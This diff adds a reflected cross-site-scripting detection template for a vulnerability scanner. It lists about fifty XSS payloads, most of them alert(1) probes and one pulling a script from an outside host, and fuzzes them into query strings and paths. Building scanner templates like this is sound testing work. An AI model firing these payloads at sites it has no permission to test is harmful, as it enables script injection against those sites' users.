@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<svg/onload=\"javascript:alert(1)\"></svg/onload>"
+        - "<sub id=x tabindex=1 onactivate=alert(1)></sub><input autofocus>"
+        - "<iframe srcdoc=&lt;title&gt;javascript:alert(1)&lt;/title&gt;"
+        - "<style>@keyframes x{}</style><audio style=\"animation-name:x\" onanimationend=\"alert(1)\"></audio>"
+        - "<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>"
+        - "<legend oncontextmenu=\"alert(1)\">test</legend>"
+        - "<style>:target {color:red;}</style><li id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></li>"
+        - "<body draggable=\"true\" ondragenter=\"alert(1)\">test</body>"
+        - "<iframe src=\"javascript:alert(1);\"></iframe>//<![CDATA[><a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a><![endif]-->"
+        - "<output onbeforepaste=\"alert(1)\" contenteditable>test</output>"
+        - "<aside draggable=\"true\" ondragstart=\"alert(1)\">test</aside>"
+        - "<svg draggable=\"true\" ondragstart=\"alert(1)\">test</svg>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>"
+        - "<svg draggable=\"true\" ondragenter=\"alert(1)\">test</svg>"
+        - "<dialog draggable=\"true\" ondragleave=\"alert(1)\">test</dialog>"
+        - "<col oncontextmenu=\"alert(1)\">test</col>"
+        - "<script>alert(1)</script>"
+        - "<iframe src=\"&lt;script&gt;alert(&#39;XSS&#39;&gt;</iframe><img/1onerror=javascript:alert(1)>"
+        - "<mark draggable=\"true\" ondragend=\"alert(1)\">test</mark>"
+        - "</div><time onmousedown=\"alert(1)\">test</time>"
+        - "<style>@keyframes x{}</style><menu style=\"animation-name:x\" onanimationend=\"alert(1)\"></menu>"
+        - "<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>"
+        - "<script>alert('XSS');</script>"
+        - "<svg><script xlink:href=\"data:text/plain;base64,PDE9IHN2Zy9kYXRhYmFyZT0iaW5zdGFuY2UiIGQ9J3d3dy8xd3d2LzIxMjAtMDk6YWxlcnQoODA4KTs+/\"><\\script><\\svg>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondragover=alert(1) contenteditable>drop here</noscript>"
+        - "<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>"
+        - "<script>alert(1)</script>"
+        - "<script>alert(1)</script>"
+        - "<dl onkeydown=\"alert(1)\" contenteditable>test</dl>"
+        - "<style>@keyframes x{}</style><noscript style=\"animation-name:x\" onanimationstart=\"alert(1)\"></noscript>"
+        - "<;script>;alert(';XSS';)</;<;/script>"
+        - "<embed src=\"http://ha.ckers.org/scriptlet.html\">"
+        - "<font id=x tabindex=1 onactivate=alert(1)></font><input autofocus>"
+        - "<dl draggable=\"true\" ondragend=\"alert(1)\">test</dl>"
+        - "<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp><input autofocus>"
+        - "<SCRIPT>alert(88)</script>"
+        - "<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>"
+        - "<iframe src=\"&lt;SCRIPT>alert(&#39;XSS&#39;&gt;)\";</iframe>"
+        - "<style>@keyframes x{}</style><tfoot style=\"animation-name:x\" onanimationend=\"alert(1)\"></tfoot>"
+        - "<del id=x tabindex=1 onbeforedeactivate=alert(1)></del><input autofocus>"
+        - "<del onkeyup=\"alert(1)\" contenteditable>test</del>"
+        - "<del draggable=\"true\" ondragstart=\"alert(1)\">test</del>"
+        - "<legend onclick=\"alert(1)\">test</legend>"
+        - "<style>:target {color:red;}</style><dialog id=x style=\"transition:color 1s\" ontransitionend=alert(1)></dialog>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>"
+        - "<style>@keyframes x{}</style><time style=\"animation-name:x\" onanimationend=\"alert(1)\"></time>"
+        - "<audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<mark draggable=\"true\" ondragstart=\"alert(1)\">test</mark>"
+        - "<marquee onmouseout=\"alert(1)\">test</marquee>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
